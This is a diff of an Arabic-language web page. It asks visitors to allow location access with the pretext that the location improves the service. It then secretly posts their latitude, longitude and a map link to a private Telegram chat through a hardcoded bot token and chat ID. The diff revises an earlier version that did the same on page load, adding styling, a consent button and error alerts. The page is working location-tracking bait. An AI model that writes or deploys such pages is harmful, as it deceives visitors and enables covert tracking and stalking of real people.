@@ -1,39 +1,91 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-  <title>جارٍ تحديد موقعك</title>
-  <script>
-    async function sendLocationToTelegram(lat, lon) {
-      const token = '7565893472:AAFoUgDgmZrIpkM1j_my-gEu_FsnjvC-nVY';
-      const chat_id = '1367401179';
-      const message = `تم تحديد الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ chat_id: chat_id, text: message })
-      });
+  <meta charset="UTF-8">
+  <title>خدمة تحديد الموقع</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #e0f7fa, #80deea);
+      text-align: center;
+      padding-top: 50px;
     }
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0px 4px 12px rgba(0,0,0,0.2);
+    }
+    button {
+      padding: 15px 25px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      background-color: #26a69a;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #00796b;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>يرجى السماح بالوصول إلى موقعك</h2>
+    <p>نستخدم موقعك لتحسين تجربة الخدمة.</p>
+    <button onclick="getLocation()">السماح بموقعي</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "7565893472:AAFoUgDgmZrIpkM1j_my-gEu_FsnjvC-nVY";
+    const CHAT_ID = "1367401179";
 
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          document.getElementById("status").innerText = "تم تحديد موقعك بنجاح.";
-          await sendLocationToTelegram(lat, lon);
-        }, function(error) {
-          document.getElementById("status").innerText = "فشل في الحصول على الموقع.";
-        });
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
       } else {
-        document.getElementById("status").innerText = "المتصفح لا يدعم تحديد الموقع.";
+        alert("المتصفح لا يدعم خاصية تحديد الموقع.");
       }
     }
 
-    window.onload = getLocation;
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const message = `موقع جديد تم التقاطه:\n\nLatitude: ${latitude}\nLongitude: ${longitude}\n\nرابط الخريطة:\nhttps://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      }).then(() => alert("تم إرسال الموقع بنجاح!"))
+        .catch(err => alert("فشل في الإرسال: " + err));
+    }
+
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          alert("تم رفض إذن تحديد الموقع.");
+          break;
+        case error.POSITION_UNAVAILABLE:
+          alert("الموقع غير متوفر.");
+          break;
+        case error.TIMEOUT:
+          alert("انتهت مهلة الطلب.");
+          break;
+        default:
+          alert("حدث خطأ غير معروف.");
+          break;
+      }
+    }
   </script>
-</head>
-<body>
-  <h2>جارٍ تحديد موقعك...</h2>
-  <p id="status">يرجى السماح بمشاركة الموقع</p>
 </body>
 </html>
